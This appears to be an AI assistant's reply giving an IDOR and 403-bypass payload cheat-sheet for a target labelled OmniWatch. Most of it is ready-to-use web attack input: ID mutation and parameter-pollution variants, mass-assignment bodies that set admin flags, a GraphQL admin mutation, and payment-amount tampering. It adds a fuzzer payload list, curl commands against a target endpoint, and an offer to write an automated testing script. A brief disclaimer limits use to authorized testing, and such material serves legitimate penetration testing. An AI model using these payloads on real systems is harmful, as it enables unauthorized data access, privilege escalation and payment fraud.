# IDOR & 403 Bypass Payloads Cheat‑Sheet — OmniWatch / adce626

**Note:** This document is for authorized security testing and CTF use only. Do not use on systems you do not have permission to test.

## Quick Usage

1. Record a baseline: HTTP status, content-length, and response body for a legitimate request.
2. Test one mutation at a time and observe differences.
3. Use Burp, replay tools, Intruder, or automation scripts to rapidly iterate permutations.

---

## 1) Basic mutation variants

Try simple changes to the `id` field inside JSON / forms / query string.

Examples:

```
{"user":{"id":123}}
{"user":{"id":"123"}}
{"user":{"id":"0123"}}
{"user":{"id": 123 }}
{"user":{"id":" 123 "}}
{"user":{"id":9223372036854775807}}
{"user":{"id":-123}}
```

Notes: watch for HTTP status changes, content-length differences, and body diffs.

---

## 2) Duplicate / parameter pollution

Send the same parameter in multiple places (query vs body) or duplicate keys inside JSON.

Examples:

```
GET /endpoint?user[id]=123  (with JSON body user[id]=456)
POST body: {"user":{"id":123}, "user":{"id":456}}
POST body: {"user":{"id":123}, "data":{"user":{"id":456}}}
```

Why it works: auth layer may read one instance while the read layer reads another.

---

## 3) Alternate field names & indirection

Try alternative field names that may map to the same backend field.

Examples:

```
{"user":{"id":123}}
{"user":{"user_id":123}}
{"user":{"customer_id":123}}
{"actor_id":123}
{"owner":123}
```

---

## 4) Content-Type / parser confusion

Change the `Content-Type` header and send the same structure in different formats.

Examples:

```
Content-Type: application/json
{"user":{"id":123}}

Content-Type: application/x-www-form-urlencoded
user[id]=123

Content-Type: multipart/form-data
--boundary
Content-Disposition: form-data; name="payload"

{"user":{"id":123}}
--boundary--
```

---

## 5) Encoding & canonicalization tricks

Encoding may make the value interpreted differently or bypass filters.

Examples:

```
URL encode: /users/%31%32%33
Double encode: %2531%2532%2533
Base64 wrapper: {"id":"MTIz"}
Percent-encoded inside JSON: {"id":"%31%32%33"}
```

---

## 6) Hidden characters & Unicode homoglyphs

Insert zero-width characters or lookalike digits to confuse string checks.

Examples:

```
{"user":{"id":"123​"}}   # zero-width space
{"user":{"id":"١٢٣"}}         # Arabic-Indic digits
{"user":{"id":"١23"}}         # mixed digits
```

---

## 7) Numeric edge cases & type coercion

Try large integers, negatives, and scientific notation.

Examples:

```
{"user":{"id":9223372036854775807}}
{"user":{"id":-1}}
{"user":{"id":4.03e2}}
{"user":{"id":"403"}}
```

---

## 8) Path vs Body mismatch

Send conflicting IDs in the URL path and request body.

Examples:

```
GET /users/123  (body: {"user":{"id":456}})
POST /orders/999 (body: {"order":{"id":1000}})
```

Why: one value may be used for auth and another for retrieval.

---

## 9) Mass-assignment / object mapping

Target ORM binding by sending additional properties or nested objects that map to model fields.

Examples:

```
{"user":{"id":123, "is_admin":true}}
{"user":{"id":123, "profile":{"owner_id":456}}}
{"user":{"id":123, "attributes":{"role":"admin"}}}
```

Check whether backend binds these fields into the DB model.

---

## 10) Nested / indirect references

Change inner references inside arrays or nested objects.

Examples:

```
{"id":123, "references":[{"id":456}]}
-> {"id":123, "references":[{"id":789}]}
```

Why: ownership checks may not traverse nested references.

---

## 11) GraphQL-style probes

If the endpoint accepts JSON queries, try varying IDs within the `query` field.

Examples:

```
{ "query": "{ user(id:123) { name } }" }
{ "query": "{ user(id:456) { name } }" }
{ "query": "mutation { updateUser(id:123, isAdmin:true) { id } }" }
```

Observe differences between resolvers and field-level authorization.

---

## 12) Race conditions / TOCTOU

Send concurrent requests: one to change state, another to fetch with manipulated data.

Conceptual example:

1. POST to change resourceA ownership
2. Immediately GET resourceA using manipulated ID in another request

Use concurrency tools or scripts to trigger race windows.

---

## 13) Empty / omitted fields

Send empty JSON or omit fields to test validators and error handling.

Examples:

```
{}
{"user":{}}
{"id":null}
```

---

## 14) Whitespace & concatenation tests

Insert spaces, newlines, or padding inside values: `"id":"123
"` or `"id":" 123 "`.

---

## 15) BOM / encoding glitches

Add a BOM or use different encodings to confuse parsers.

---

## 16) Control chars / Null byte (staging only)

Do not run on production.

Examples:

```
{"id":"123�"}
```

---

## 17) XML entity / XXE (if XML supported)

Test XML payloads if the server accepts them — be cautious of side effects.

---

## 18) Subaddressing / plus tagging (emails)

`user+tag@example.com` may affect routing or validation.

---

## 19) Domain / host edge cases

Use `localhost`, `127.0.0.1`, `.example`, or small domain mutations to test hostname validation.

---

## 20) Payment-specific tests (403 bypass for amounts)

Examples for amount manipulation:

```
{"amount":403}
{"amount":"403"}
{"amount":4.03e2}
{"amount":-403}
{"amount":40300, "currency":"cents"}
{"amount":403, "productId":456}
```

Check whether server recalculates price from productId or trusts client-supplied amount.

---

## Ready-to-use payload list (for Burp Intruder / wfuzz)

Each line can be used as `{{PAYLOAD}}` replacing an id value in requests.

```
123
"123"
0123
"0123"
 123 
"123​"
9223372036854775807
-1
0
4.03e2
"MTIz"
%31%32%33
%2531%2532%2533
"١٢٣"
{"id":123}
{"user":{"id":123}}
user[id]=123
user%5Bid%5D=123
{"user":{"id":123}, "user":{"id":456}}
{"user":{"user_id":123}}
{"user":{"customer_id":123}}
{"user":{"id":123, "is_admin":true}}
{"id":123, "references":[{"id":789}]}
```

---

## Quick curl examples

```
curl -X POST -H "Content-Type: application/json" -d '{"user":{"id":123}}' https://target/endpoint
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'user[id]=123' https://target/endpoint
curl -X POST 'https://target/endpoint?user[id]=123' -H "Content-Type: application/json" -d '{"user":{"id":456}}'
curl -X POST -H "Content-Type: application/json" -d $'{"user":{"id":"123​"}}' https://target/endpoint
```

---

## Testing methodology (skeptical approach)

1. Capture baseline (status, length, body).
2. Change one variable at a time.
3. Compare diffs using `diff`, `jq -C`, or automated tools.
4. Try combined permutations (duplicates + encoding + content-type).
5. Keep detailed logs of every attempt.

---

## Next steps I can prepare immediately

Choose one and I will prepare it now:

* A downloadable `payloads.txt` file that contains the payload lines above (ready for Burp Intruder).
* A Python script that automatically tests a set of mutations against a given endpoint (CTF/testing only).

Tell me which one you want and I will produce it.
